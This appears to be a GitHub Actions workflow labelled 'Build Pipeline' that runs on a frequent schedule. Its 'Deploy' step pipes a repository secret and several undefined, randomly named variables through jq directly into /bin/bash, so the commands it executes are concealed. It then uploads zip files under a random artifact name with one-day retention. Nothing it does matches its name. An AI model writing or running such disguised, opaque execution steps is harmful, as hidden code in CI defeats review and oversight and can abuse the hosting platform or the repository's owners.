name: Build Pipeline
on:
  workflow_dispatch:

  schedule:
    - cron: '9 2,8,14,20 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  dispatcher:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Deploy
        env:
          zish364: ${{ secrets.zish364 }}
        run: |
          printf '%s' "$zish364" | jq -r .rw0 | /bin/bash
          echo $lvwzm0095 | jq -r .vhtjf3 | /bin/bash
          printf '%s' "$ief0653" | jq -r .l86 | /bin/bash
          echo $c95 | jq -r .o9137 | /bin/bash
          echo $nrtji86 | jq -r .cx48 | /bin/bash

      - name: Save results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: DkiEleBH
          path: "*.zip"
          retention-days: 1
